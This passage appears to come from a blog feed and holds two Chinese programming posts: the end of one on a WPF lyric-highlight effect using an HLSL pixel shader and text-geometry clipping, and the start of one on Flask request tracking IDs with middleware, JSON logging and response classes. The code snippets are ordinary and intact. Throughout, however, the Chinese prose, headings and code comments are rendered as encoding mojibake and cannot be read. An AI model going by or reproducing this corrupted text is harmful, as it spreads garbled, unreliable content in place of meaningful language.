<p>ç¼è¯HLSLä»£ç çæ<code>.ps</code>æä»¶ï¼ç¶åå¨WPFä¸­ä½¿ç¨<code>PixelShader</code>ç±»å è½½ï¼</p>
<div class="relative code-block">
<div data-overlayscrollbars-viewport="scrollbarHidden overflowXHidden overflowYHidden">
<div class="cnblogs_code">
<pre>fxc /T ps_3_0 /E main /Fo TextGlow.<span style="color: rgba(0, 0, 255, 1)">ps</span> TextGlow.hlsl</pre>
</div>
</div>
</div>
<p>å°è£æEffectç±»æ­¤å¤ä¸åèµè¿°ï¼åªéè¦ä¸¥æ ¼æç§åæ°é¡ºåºä¼ éå³å¯ã</p>
<h2 id="ä¸wpfç¨æ·æ§ä»¶å°è£">ä¸ãWPFç¨æ·æ§ä»¶å°è£</h2>
<h3 id="æ ¸å¿åºè£">æ ¸å¿åºè£</h3>
<p>ç¨ä¸ä¸ª&nbsp;<code>Rectangle</code>&nbsp;æ¿è½½çè²å¨ææï¼éè¿<code>FormattedText</code>çæææ¬çå ä½å½¢ç¶ä½ä¸ºè£åªè·¯å¾ï¼è¿æ ·WPFåªä¼æ¸²æææ¬åºåå¹¶ä¸ä¿çæ¸æ°çææ¬è¾¹ç¼ã</p>
<h3 id="å±æ§ç»§æ¿ä¸åæ°æ®è¦å">å±æ§ç»§æ¿ä¸åæ°æ®è¦å</h3>
<p>ä¸ºäºè®©é«äº®æ§ä»¶æ¯ææ åçææ¬å±æ§ï¼å­ä½ãå¤§å°ãç²ç»ç­ï¼ï¼ä½¿ç¨äºWPFçåæ°æ®è¦åæºå¶ãå¨éææé å½æ°ä¸­å¯¹&nbsp;<code>FontFamily</code>ã<code>FontSize</code>ã<code>FontWeight</code>&nbsp;ç­å±æ§è¿è¡&nbsp;<code>OverrideMetadata</code>ï¼ç»å®å°ç»ä¸ç&nbsp;<code>OnTextPropertyChanged</code>&nbsp;åè°ãå½è¿äºå±æ§ååæ¶ï¼è§¦åææ¬è£åªçéæ°è®¡ç®ãç±»ä¼¼å°ï¼<code>Foreground</code>&nbsp;å±æ§ä¹è¢«è¦åï¼å½ææ¬é¢è²æ¹åæ¶ç´æ¥æ´æ°&nbsp;<code>Rectangle</code>&nbsp;çå¡«åé¢è²ã</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 128, 128, 1)"> 1</span> <span style="color: rgba(0, 0, 255, 1)">static</span><span style="color: rgba(0, 0, 0, 1)"> HighlightTextBlock()
</span><span style="color: rgba(0, 128, 128, 1)"> 2</span> <span style="color: rgba(0, 0, 0, 1)">{
</span><span style="color: rgba(0, 128, 128, 1)"> 3</span>     FontFamilyProperty.OverrideMetadata(<span style="color: rgba(0, 0, 255, 1)">typeof</span><span style="color: rgba(0, 0, 0, 1)">(HighlightTextBlock),
</span><span style="color: rgba(0, 128, 128, 1)"> 4</span>         <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> FrameworkPropertyMetadata(SystemFonts.MessageFontFamily, OnTextPropertyChanged));
</span><span style="color: rgba(0, 128, 128, 1)"> 5</span>     FontSizeProperty.OverrideMetadata(<span style="color: rgba(0, 0, 255, 1)">typeof</span><span style="color: rgba(0, 0, 0, 1)">(HighlightTextBlock),
</span><span style="color: rgba(0, 128, 128, 1)"> 6</span>         <span style="color: rgba(0, 0, 255, 1)">new</span> FrameworkPropertyMetadata(<span style="color: rgba(128, 0, 128, 1)">14.0</span><span style="color: rgba(0, 0, 0, 1)">, OnTextPropertyChanged));
</span><span style="color: rgba(0, 128, 128, 1)"> 7</span>     FontWeightProperty.OverrideMetadata(<span style="color: rgba(0, 0, 255, 1)">typeof</span><span style="color: rgba(0, 0, 0, 1)">(HighlightTextBlock),
</span><span style="color: rgba(0, 128, 128, 1)"> 8</span>         <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> FrameworkPropertyMetadata(FontWeights.Normal, OnTextPropertyChanged));
</span><span style="color: rgba(0, 128, 128, 1)"> 9</span>     ForegroundProperty.OverrideMetadata(<span style="color: rgba(0, 0, 255, 1)">typeof</span><span style="color: rgba(0, 0, 0, 1)">(HighlightTextBlock),
</span><span style="color: rgba(0, 128, 128, 1)">10</span>         <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> FrameworkPropertyMetadata(Brushes.Black, OnForegroundChanged));
</span><span style="color: rgba(0, 128, 128, 1)">11</span> <span style="color: rgba(0, 0, 0, 1)">}
</span><span style="color: rgba(0, 128, 128, 1)">12</span> 
<span style="color: rgba(0, 128, 128, 1)">13</span> <span style="color: rgba(0, 0, 255, 1)">private</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span><span style="color: rgba(0, 0, 0, 1)"> OnForegroundChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
</span><span style="color: rgba(0, 128, 128, 1)">14</span> <span style="color: rgba(0, 0, 0, 1)">{
</span><span style="color: rgba(0, 128, 128, 1)">15</span>     <span style="color: rgba(0, 0, 255, 1)">if</span> (d <span style="color: rgba(0, 0, 255, 1)">is</span><span style="color: rgba(0, 0, 0, 1)"> HighlightTextBlock control)
</span><span style="color: rgba(0, 128, 128, 1)">16</span>         control.PART_Rectangle.Fill = e.NewValue <span style="color: rgba(0, 0, 255, 1)">as</span><span style="color: rgba(0, 0, 0, 1)"> Brush;
</span><span style="color: rgba(0, 128, 128, 1)">17</span> }</pre>
</div>
<p>è¿æ ·ç¨æ·å°±å¯ä»¥åä½¿ç¨æ®é&nbsp;<code>TextBlock</code>&nbsp;ä¸æ ·ä½¿ç¨è¿ä¸ªæ§ä»¶ï¼äº«åXAMLçå±æ§ç»å®åæ ·å¼ç³»ç»ã</p>
<h3 id="ææ¬æçä¸è£åª">ææ¬æçä¸è£åª</h3>
<p><code>UpdateTextClip()</code>&nbsp;æ¹æ³è´è´£ï¼</p>
<ol>
<li>åå»ºæçå¯¹è±¡&nbsp;- éè¿&nbsp;<code>FormattedText</code>&nbsp;å°ææ¬æç§æ§ä»¶çå­ä½ãå¤§å°ãæ ·å¼åæ°è¿è¡æçï¼è·å¾ä¸å®éæ¸²æå®å¨ä¸è´çææ¬åº¦é</li>
</ol>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">var</span> formattedText = <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> FormattedText(
    Text,
    CultureInfo.CurrentCulture,
    FlowDirection,
    </span><span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> Typeface(FontFamily, FontStyle, FontWeight, FontStretch),
    FontSize,
    Brushes.Black,
    VisualTreeHelper.GetDpi(</span><span style="color: rgba(0, 0, 255, 1)">this</span>).PixelsPerDip);</pre>
</div>
<ol start="2">
<li>å¤çæ¢è¡ä¸å®½åº¦çº¦æ&nbsp;- å½å¯ç¨&nbsp;<code>TextWrapping</code>&nbsp;æ¶ï¼ä»&nbsp;<code>Width</code>ã<code>MaxWidth</code>&nbsp;æ&nbsp;<code>ActualWidth</code>&nbsp;ä¸­ååºçº¦æå®½åº¦ãåªæå¨éè¦æ¢è¡ä¸æçº¦æå®½åº¦çæåµä¸ï¼æè®¾ç½®&nbsp;<code>MaxTextWidth</code>&nbsp;è®©ææ¬èªå¨æè¡</li>
</ol>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">var</span> constraintWidth = !<span style="color: rgba(0, 0, 255, 1)">double</span>.IsNaN(Width) &amp;&amp; Width &gt; <span style="color: rgba(128, 0, 128, 1)">0</span>
    ?<span style="color: rgba(0, 0, 0, 1)"> Width
    : (</span>!<span style="color: rgba(0, 0, 255, 1)">double</span>.IsInfinity(MaxWidth) &amp;&amp; MaxWidth &gt; <span style="color: rgba(128, 0, 128, 1)">0</span> ?<span style="color: rgba(0, 0, 0, 1)"> MaxWidth : ActualWidth);

</span><span style="color: rgba(0, 0, 255, 1)">if</span> (TextWrapping != TextWrapping.NoWrap &amp;&amp; constraintWidth &gt; <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">)
    formattedText.MaxTextWidth </span>= constraintWidth;</pre>
</div>
<ol start="3">
<li>è®¡ç®å®¹å¨å°ºå¯¸&nbsp;- NoWrapä¸å®¹å¨å®½åº¦å°±æ¯ææ¬å®½åº¦ï¼æ¢è¡æ¨¡å¼ä¸åä¸ºçº¦æå®½åº¦ï¼ä»¥ç¡®ä¿&nbsp;<code>Rectangle</code>&nbsp;çå¤§å°ä¸å®éææ¬èå´å¹é</li>
</ol>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">var</span> containerWidth = TextWrapping ==<span style="color: rgba(0, 0, 0, 1)"> TextWrapping.NoWrap
    </span>?<span style="color: rgba(0, 0, 0, 1)"> textWidth
    : (constraintWidth </span>&gt; <span style="color: rgba(128, 0, 128, 1)">0</span> ? constraintWidth : textWidth);</pre>
</div>
<ol start="4">
<li>å¤çææ¬å¯¹é½&nbsp;- æ ¹æ®&nbsp;<code>TextAlignment</code>&nbsp;è®¡ç®ææ¬ç¸å¯¹äºå®¹å¨çèµ·å§åç§»ï¼ç¨äºå±ä¸­åå³å¯¹é½ï¼ï¼ç¶åçæRectangleæ¶ä¼ å¥è¿ä¸ªåç§»éï¼åæ¶æ´æ°&nbsp;<code>Rectangle</code>&nbsp;çæ°´å¹³å¯¹é½å±æ§ä½¿å¶ä¸ææ¬å¯¹é½æ¹å¼ä¸è´</li>
</ol>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">double</span> offsetX = <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">if</span> (containerWidth &gt;<span style="color: rgba(0, 0, 0, 1)"> textWidth)
{
    offsetX </span>= TextAlignment <span style="color: rgba(0, 0, 255, 1)">switch</span><span style="color: rgba(0, 0, 0, 1)">
    {
        TextAlignment.Center </span>=&gt; (containerWidth - textWidth) / <span style="color: rgba(128, 0, 128, 1)">2</span><span style="color: rgba(0, 0, 0, 1)">,
        TextAlignment.Right </span>=&gt; containerWidth -<span style="color: rgba(0, 0, 0, 1)"> textWidth,
        _ </span>=&gt; <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">
    };
}</span></pre>
</div>
<ol start="5">
<li>çæå¹¶åºç¨è£åª&nbsp;- è°ç¨&nbsp;<code>formattedText.BuildGeometry()</code>&nbsp;å¾å°ç²¾ç¡®çææ¬è½®å»Rectangleï¼è®¾ç½®ä¸º&nbsp;<code>Rectangle.Clip</code>ãè¿æ ·çè²å¨çè¾åºå°±è¢«éå¶å¨ææ¬åç´ èå´å</li>
</ol>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">var</span> geometry = formattedText.BuildGeometry(<span style="color: rgba(0, 0, 255, 1)">new</span> Point(offsetX, <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">));
PART_Rectangle.Clip </span>=<span style="color: rgba(0, 0, 0, 1)"> geometry;
PART_Rectangle.Width </span>=<span style="color: rgba(0, 0, 0, 1)"> containerWidth;
PART_Rectangle.Height </span>= textHeight;</pre>
</div>
<h3 id="é«äº®åæ°çå¨ç»é©±å¨">é«äº®åæ°çå¨ç»é©±å¨</h3>
<p>é«äº®ææçä¸ä¸ªå³é®åæ°ï¼<code>HighlightPos</code>ã<code>HighlightWidth</code>ã<code>HighlightColor</code>ï¼é½è¢«æ´é²ä¸ºä¾èµå±æ§ï¼å¨å±æ§åååè°ä¸­ç´æ¥åæ­¥å°çè²å¨ Effect å¯¹è±¡ï¼</p>
<div class="cnblogs_code">
<pre><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">readonly</span> DependencyProperty HighlightPosProperty =<span style="color: rgba(0, 0, 0, 1)">
    DependencyProperty.Register(
        nameof(HighlightPos),
        </span><span style="color: rgba(0, 0, 255, 1)">typeof</span>(<span style="color: rgba(0, 0, 255, 1)">double</span><span style="color: rgba(0, 0, 0, 1)">),
        </span><span style="color: rgba(0, 0, 255, 1)">typeof</span><span style="color: rgba(0, 0, 0, 1)">(HighlightTextBlock),
        </span><span style="color: rgba(0, 0, 255, 1)">new</span> PropertyMetadata(<span style="color: rgba(128, 0, 128, 1)">0.0</span><span style="color: rgba(0, 0, 0, 1)">, OnHighlightPosChanged));

</span><span style="color: rgba(0, 0, 255, 1)">private</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span><span style="color: rgba(0, 0, 0, 1)"> OnHighlightPosChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
{
    </span><span style="color: rgba(0, 0, 255, 1)">if</span> (d <span style="color: rgba(0, 0, 255, 1)">is</span><span style="color: rgba(0, 0, 0, 1)"> HighlightTextBlock c)
        c._effect.HighlightPos </span>= (<span style="color: rgba(0, 0, 255, 1)">double</span><span style="color: rgba(0, 0, 0, 1)">)e.NewValue;
}</span></pre>
</div>
<p>è¿æ ·å°±å¯ä»¥å¨XAMLä¸­è½»æ¾ä½¿ç¨&nbsp;<code>Storyboard</code>&nbsp;å&nbsp;<code>DoubleAnimation é©±å¨&nbsp;<code>HighlightPos</code>&nbsp;çå¹³æ»ååï¼ä»èå®ç°åçº¿æ«è¿ææ¬çè¿è´¯å¨ç»ææã</code></p>
<h2 id="åççææ">åãççææ</h2>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1188749/202601/1188749-20260117211801312-760359975.png" class="lazyload"></p>
<p>å¯¹æ¯Additiveå å åLerpçº¿æ§æ¸åä¸¤ç§æ¨¡å¼ï¼å¯ä»¥çå°Additiveæ¨¡å¼ä¸é«äº®é¨åæ´äº®æ´æåæï¼èLerpæ¨¡å¼å°¾æ®µåç°ã</p>
<p>&nbsp;</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1188749/202601/1188749-20260117211812759-2145659902.png" class="lazyload"></p>
<p>å°è¯ä½¿ç¨å½©è²é«äº®ï¼åæäºæ··è²ææã</p>
<h2 id="åå¨æå">åå¨æå</h2>
<p>LemonLiteæ­£å¨é¾éå¼åä¸­ï¼è¿ç¨ä¸­éå°çåç§é®é¢åè§£å³æ¹æ¡é½ä¼éç»­åæåå®¢åäº«åºæ¥ï¼æ¬¢è¿åä½å¤§ä½¬æç»­å³æ³¨ã<br>ä»ä¹ï¼ä½ é®æå¼å¤´çèæ¯æ¯æä¹åçï¼è§ä¸ä¸ç¯æç« ï¼<a href="https://blog.twlmgatito.cn/posts/wpf-mica-image-with-major-color-extract/" rel="noopener nofollow">WPF ä½¿ç¨GDI+æåå¾çä¸»è²è°å¹¶çæMicaæè´¨ç¹æèæ¯ - Twlm's Blog</a><a href="http://127.0.0.1:4321/posts/wpf-mica-image-with-major-color-extract/" rel="noopener nofollow"><br></a></p>
<p>åèèµæï¼</p>
<ul>
<ul>
<li><a href="https://blog.walterlv.com/post/create-wpf-pixel-shader-effects-using-shazzam-shader-editor.html" rel="noopener nofollow">WPF åç´ çè²å¨å¥é¨ï¼ä½¿ç¨ Shazzam Shader Editor ç¼å HLSL åç´ çè²å¨ä»£ç  - walterlv</a></li>
<li><a href="https://blog.walterlv.com/post/create-a-realistic-sunshine-on-your-desktop-using-wpf.html" rel="noopener nofollow">ä½¿ç¨ WPF åä¸ä¸ªå¯ä»¥é¼çå°ç§äº®ä½ æ¡é¢çé«æ§è½é³å - walterlv</a></li>


</ul>

</ul>
<p>&nbsp;</p>
<p><img alt="" class="lazyloaded lazyload" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1188749/202407/1188749-20240702112134529-1920703459.png"></p>
<p>&nbsp; æ¬ä½åéç¨&nbsp;<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener nofollow">ç¥è¯å±äº«ç½²å-éåä¸æ§ä½¿ç¨-ç¸åæ¹å¼å±äº« 4.0 å½éè®¸å¯åè®®</a>&nbsp;è¿è¡è®¸å¯ãæ¬¢è¿è½¬è½½ãä½¿ç¨ãéæ°åå¸ï¼ä½å¡å¿ä¿çæç« ç½²åTwilightLemonï¼ä¸å¾ç¨äºåä¸ç®çï¼åºäºæ¬æä¿®æ¹åçä½åå¡å¿ä»¥ç¸åçè®¸å¯åå¸ã</p>
<p>&nbsp;</p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.01597222222222222" data-date-updated="2026-01-17 21:18">2026-01-17 20:55</span>&nbsp;
<a href="https://www.cnblogs.com/TwilightLemon">TwilightLemon</a>&nbsp;
éè¯»(<span id="post_view_count">73</span>)&nbsp;
è¯è®º(<span id="post_comment_count">2</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19497125);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19497125', targetLink: 'https://www.cnblogs.com/TwilightLemon/p/19497125', title: 'WPF ä½¿ç¨ HLSL + Clip å®ç°é«äº®æ­è¯åç§ææ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ [python]Flask - Tracking IDçè®¾è®¡ ]]></title>
    <link>https://www.cnblogs.com/XY-Heruo/p/19496753</link>
    <guid>f6b228ea17a8e614ea266f12681ae281</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/XY-Heruo/p/19496753" title="åå¸äº 2026-01-17 17:22">
    <span role="heading" aria-level="2">[python]Flask - Tracking IDçè®¾è®¡</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ¬æè¯¦ç»ä»ç»å¦ä½å¨ Flask åºç¨ä¸­å®ç°è¯·æ±è·è¸ª ID (tracking_id) åè½ï¼åæ¬ä¸­é´ä»¶è®¾è®¡ãæ¥å¿è®°å½ãååºæ ¼å¼åç­å®æ´æ¹æ¡ï¼å¸®å©å¼åèå®ç°è¯·æ±é¾è·¯è¿½è¸ªï¼æåç³»ç»å¯è§æµæ§ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨</h2>
<p>å¨å®éä¸å¡ä¸­ï¼æ ¹æ® <code>tracking_id</code> è¿½æº¯ä¸æ¡è¯·æ±çå®æ´å¤çè·¯å¾æ¯æ¯è¾å¸¸è§çéæ±ãåå© Flask èªå¸¦çå¨å±å¯¹è±¡ <code>g</code> ä»¥åé©å­å½æ°ï¼å¯ä»¥å¾å®¹æå°ä¸ºæ¯æ¡è¯·æ±æ·»å  <code>tracking_id</code>ï¼å¹¶å¨æ¥å¿ä¸­èªå¨è®°å½ã</p>
<p>ä¸»è¦åå®¹ï¼</p>
<ul>
<li>å¦ä½ä¸ºæ¯æ¡è¯·æ±æ·»å  <code>tracking_id</code></li>
<li>å¦ä½ä¸ºæ¥å¿èªå¨æ·»å  <code>tracking_id</code> è®°å½</li>
<li>å¦ä½èªå®ä¹ååºç±»ï¼å®ç°ç»ä¸çååºæ ¼å¼ï¼å¹¶å¨ååºå¤´ä¸­æ·»å  <code>tracking_id</code></li>
<li>è§å¾å½æ°ååæµè¯ç¤ºä¾</li>
<li>Gunicorn éç½®</li>
</ul>
<h2 id="é¡¹ç®ç»æ">é¡¹ç®ç»æ</h2>
<p>è½ç¶åå®¹çèµ·æ¥å¾å¤ï¼ä½ tracking_id çå®ç°å¶å®å¾ç®åãæ¬ææç§çäº§é¡¹ç®çè§èç»ç»äºä»£ç ï¼æ·»å äº Gunicorn éç½®åååæµè¯ä»£ç ï¼ä»¥åè§èäºæ¥å¿æ ¼å¼å JSON ååºæ ¼å¼ã</p>
<pre><code>âââ apis
â   âââ common
â   â   âââ common.py
â   â   âââ __init__.py
â   âââ __init__.py
âââ gunicorn.conf.py
âââ handles
â   âââ user.py
âââ logs
â   âââ access.log
â   âââ error.log
âââ main.py
âââ middlewares
â   âââ __init__.py
â   âââ tracking_id.py
âââ pkgs
â   âââ log
â       âââ app_log.py
â       âââ __init__.py
âââ pyproject.toml
âââ pytest.ini
âââ README.md
âââ responses
â   âââ __init__.py
â   âââ json_response.py
âââ tests
â   âââ apis
â       âââ test_common.py
âââ tmp
â   âââ gunicorn.pid
âââ uv.lock
</code></pre>
<p>å®è£ä¾èµ</p>
<pre><code class="language-shell">uv add flask
uv add gunicorn gevent  # çäº§ç¯å¢é¨ç½²ä¸è¬ä¾èµè¿ä¸¤ä¸ª
uv add --dev pytest           # æµè¯åº
</code></pre>
<h2 id="å®ç°æ·»å -tracking_id-çä¸­é´ä»¶">å®ç°æ·»å  tracking_id çä¸­é´ä»¶</h2>
<p>ä»£ç æä»¶ï¼<code>middlewares/tracking_id.py</code></p>
<pre><code class="language-python">from uuid import uuid4

from flask import Flask, Response, g, request


def tracking_id_middleware(app: Flask):
    """
    è·è¸ª ID ä¸­é´ä»¶
    ä¸ºæ¯ä¸ªè¯·æ±çææè·åè·è¸ª IDï¼ç¨äºè¿½è¸ªè¯·æ±é¾è·¯
    """
    
    @app.before_request
    def tracking_id_before_request():
        """
        è¯·æ±åå¤çå½æ°
        æ£æ¥è¯·æ±å¤´ä¸­æ¯å¦åå« X-Tracking-IDï¼å¦ææ²¡æåçæä¸ä¸ªæ°ç UUID ä½ä¸ºè·è¸ª ID
        å¹¶å°å¶å­å¨å° Flask çå¨å±å¯¹è±¡ g ä¸­ï¼ä¾åç»­å¤çä½¿ç¨
        """
        # ä»è¯·æ±å¤´ä¸­è·å X-Tracking-ID
        tracking_id = request.headers.get("X-Tracking-ID")
        if not tracking_id:
            # å¦æè¯·æ±å¤´ä¸­æ²¡æ X-Tracking-IDï¼åçæä¸ä¸ªæ°ç UUID
            tracking_id = str(uuid4())
        # å°è·è¸ª ID å­å¨å° Flask çå¨å±å¯¹è±¡ g ä¸­ï¼ä¾åç»­å¤çä½¿ç¨
        g.tracking_id = tracking_id

    @app.after_request
    def tracking_id_after_request(response: Response):
        """
        è¯·æ±åå¤çå½æ°
        å°è·è¸ª ID æ·»å å°ååºå¤´ä¸­ï¼ä»¥ä¾¿å®¢æ·ç«¯ç¥éæ¬æ¬¡è¯·æ±çè·è¸ª ID
        """
        # æ£æ¥ååºå¤´ä¸­æ¯å¦å·²ç»æ X-Tracking-ID
        tracking_id = response.headers.get("X-Tracking-ID", "")
        if not tracking_id:
            # å¦æååºå¤´ä¸­æ²¡æ X-Tracking-IDï¼åä»å¨å±å¯¹è±¡ g ä¸­è·å
            tracking_id = g.get("tracking_id", "")
            # å°è·è¸ª ID æ·»å å°ååºå¤´ä¸­
            response.headers["X-Tracking-ID"] = tracking_id
        return response

    # è¿ååºç¨å®ä¾
    return app
</code></pre>
<p>ä»£ç æä»¶ <code>middlewares/__init__.py</code>ï¼æ¹ä¾¿å¶ä»æ¨¡åå¯¼å¥</p>
<pre><code class="language-python">from .tracking_id import tracking_id_middleware

__all__ = [
    "tracking_id_middleware",
]
</code></pre>
<h2 id="æ¥å¿æ¨¡å---èªå¨è®°å½-tracking_id">æ¥å¿æ¨¡å - èªå¨è®°å½ tracking_id</h2>
<p>å®ç°ä¸ä¸ªç®åçè¾åºå°æ§å¶å°çæ¥å¿æ¨¡åï¼æ¥å¿æ ¼å¼ä¸º JSONï¼èªå¨æ·»å  tracking_id å°æ¥å¿ä¸­ï¼é¿åæå¨å¨ <code>logger.info()</code> è¿ç±»æ¹æ³ä¸­ä¼ å¥ <code>tracking_id</code>ã</p>
<p>ä»£ç æä»¶ <code>pkgs/log/app_log.py</code></p>
<pre><code class="language-python">import json
import logging
import sys

from flask import g


class JSONFormatter(logging.Formatter):
    """æ¥å¿æ ¼å¼åå¨ï¼è¾åº JSON æ ¼å¼çæ¥å¿ã"""

    def format(self, record: logging.LogRecord) -&gt; str:
        log_record = {
            "@timestamp": self.formatTime(record, "%Y-%m-%dT%H:%M:%S%z"),
            "level": record.levelname,
            "name": record.name,
            # "processName": record.processName,  # å¦éè®°å½è¿ç¨åå¯åæ¶æ³¨é
            "tracking_id": getattr(record, "tracking_id", None),
            "loc": "%s:%d" % (record.filename, record.lineno),
            "func": record.funcName,
            "message": record.getMessage(),
        }

        return json.dumps(log_record, ensure_ascii=False, default=str)


class TrackingIDFilter(logging.Filter):
    """æ¥å¿è¿æ»¤å¨ï¼ä¸ºæ¥å¿è®°å½æ·»å  tracking_idã"""

    def filter(self, record):
        record.tracking_id = g.get("tracking_id", None)
        return True


def _setup_console_handler(level: int) -&gt; logging.StreamHandler:
    """è®¾ç½®æ§å¶å°æ¥å¿å¤çå¨ã

    Args:
        level (int): æ¥å¿çº§å«ã
    """
    handler = logging.StreamHandler(sys.stdout)
    handler.setLevel(level)
    handler.setFormatter(JSONFormatter())
    return handler


def setup_app_logger(level: int = logging.INFO, name: str = "app") -&gt; logging.Logger:
    logger = logging.getLogger(name)

    if logger.hasHandlers():
        return logger

    logger.setLevel(level)
    logger.propagate = False

    logger.addHandler(_setup_console_handler(level))
    logger.addFilter(TrackingIDFilter())

    return logger
</code></pre>
<p>å¨ <code>pkgs/log/__init__.py</code> ä¸­åå§å <code>logger</code>ï¼å®ç°åä¾è°ç¨ã</p>
<pre><code class="language-python">from .app_log import setup_app_logger

logger = setup_app_logger()

__all__ = ["logger"]
</code></pre>
<h2 id="èªå®ä¹ååºç±»">èªå®ä¹ååºç±»</h2>
<p>è§è JSON ç±»åçååºæ ¼å¼ï¼å¹¶å¨ååºå¤´ä¸­æ·»å  <code>X-Tracking-ID</code> å <code>X-DateTime</code>ã</p>
<p>ä»£ç æä»¶ <code>responses/json_response.py</code></p>
<pre><code class="language-python">import json
from datetime import datetime
from http import HTTPStatus
from typing import Any

from flask import Response, g, request


class JsonResponse(Response):
    def __init__(
        self,
        data: Any = None,
        code: HTTPStatus = HTTPStatus.OK,
        msg: str = "this is a json response",
    ):
        x_tracking_id = g.get("tracking_id", "")
        x_datetime = datetime.now().astimezone().isoformat(timespec="seconds")
        resp_headers = {
            "Content-Type": "application/json",
            "X-Tracking-ID": x_tracking_id,
            "X-DateTime": x_datetime,
        }
        try:
            resp = json.dumps(
                {
                    "code": code.value,
                    "msg": msg,
                    "data": data,
                },
                ensure_ascii=False,
                default=str,
            )
        except Exception as e:
            resp = json.dumps(
                {
                    "code": HTTPStatus.INTERNAL_SERVER_ERROR.value,
                    "msg": f"Response serialization error: {str(e)}",
                    "data": None,
                }
            )
        super().__init__(response=resp, status=code.value, headers=resp_headers)


class Success(JsonResponse):
    def __init__(self, data: Any = None, msg: str = ""):
        if not msg:
            msg = f"{request.method} {request.path} success"
        super().__init__(data=data, code=HTTPStatus.OK, msg=msg)


class Fail(JsonResponse):
    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} failed"
        super().__init__(data=data, code=HTTPStatus.INTERNAL_SERVER_ERROR, msg=msg)


class ArgumentNotFound(JsonResponse):
    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} argument not found"
        super().__init__(data=data, code=HTTPStatus.BAD_REQUEST, msg=msg)


class ArgumentInvalid(JsonResponse):
    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} argument invalid"
        super().__init__(data=data, code=HTTPStatus.BAD_REQUEST, msg=msg)


class AuthFailed(JsonResponse):
    """HTTP ç¶æç : 401"""

    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} auth failed"
        super().__init__(data=data, code=HTTPStatus.UNAUTHORIZED, msg=msg)


class ResourceConflict(JsonResponse):
    """HTTP ç¶æç : 409"""

    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} resource conflict"
        super().__init__(data=data, code=HTTPStatus.CONFLICT, msg=msg)


class ResourceNotFound(JsonResponse):
    """HTTP ç¶æç : 404"""

    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} resource not found"
        super().__init__(data=data, code=HTTPStatus.NOT_FOUND, msg=msg)


class ResourceForbidden(JsonResponse):
    """HTTP ç¶æç : 403"""

    def __init__(self, msg: str = "", data: Any = None):
        if not msg:
            msg = f"{request.method} {request.path} resource forbidden"
        super().__init__(data=data, code=HTTPStatus.FORBIDDEN, msg=msg)

</code></pre>
<p>ä»£ç æä»¶ <code>responses/__init__.py</code>ï¼æ¹ä¾¿å¶ä»æ¨¡åè°ç¨ã</p>
<pre><code class="language-python">from .json_response import (
    ArgumentInvalid,
    ArgumentNotFound,
    AuthFailed,
    Fail,
    JsonResponse,
    ResourceConflict,
    ResourceForbidden,
    ResourceNotFound,
    Success,
)

__all__ = [
    "JsonResponse",
    "Success",
    "Fail",
    "ArgumentNotFound",
    "ArgumentInvalid",
    "AuthFailed",
    "ResourceConflict",
    "ResourceNotFound",
    "ResourceForbidden",
]
</code></pre>
<h2 id="ç¼åè§å¾å½æ°">ç¼åè§å¾å½æ°</h2>
<p>ä»£ç æä»¶ <code>apis/common/common.py</code>ãä»¥ä¸å®ä¹äº 5 ä¸ªè·¯ç±ï¼ä¸»è¦ç¨äºæµè¯ååºç±»æ¯å¦æ­£å¸¸è¿å JSON æ ¼å¼ã</p>
<pre><code class="language-python">from datetime import datetime

from flask import Blueprint

from handles import user as user_handle
from pkgs.log import logger
from responses import Success

route = Blueprint("common_apis", __name__, url_prefix="/api")

